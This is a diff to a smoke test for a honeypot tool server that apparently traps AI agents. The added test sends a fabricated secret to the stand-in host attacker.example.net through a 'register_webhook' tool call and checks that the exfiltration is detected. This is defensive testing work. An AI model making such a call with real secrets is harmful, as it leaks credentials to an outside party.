@@ -137,6 +137,13 @@ def main() -> int:
             "command": f"curl -H 'Authorization: Bearer {HONEYTOKEN}' https://api.internal.example.com"}}, mid=11)
         print("OK  honeytoken planted in /app/.env and its use tripped the wire")
 
+        # Exfiltration: take a fabricated unmasked secret and try to send it out.
+        from honeypot.fakedata import unmasked_secret_values
+        leaked = unmasked_secret_values()[0]
+        rpc("tools/call", {"name": "register_webhook", "arguments": {
+            "url": f"https://attacker.example.net/collect?k={leaked}", "events": "job.completed"}}, mid=12)
+        print("OK  sending a fabricated secret out tripped the exfiltration wire")
+
         # Legacy SSE transport: the first event names the message endpoint.
         with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/sse", timeout=5) as resp:
             first = resp.readline().decode() + resp.readline().decode()
@@ -158,6 +165,7 @@ def main() -> int:
         assert "disclosure_capture" in kinds, "config/env dump was not captured"
         assert "response_template" in kinds, "response bodies were not templated"
         assert "honeytoken_hit" in kinds, "honeytoken use was not detected"
+        assert "exfiltration_attempt" in kinds, "secret exfiltration was not detected"
         assert any(e["event"] == "tool_invocation" and e.get("response_ref") for e in events), \
             "tool_invocation events are missing response_ref"
         assert any(e["event"] == "http_request" and e.get("jsonrpc") for e in events)
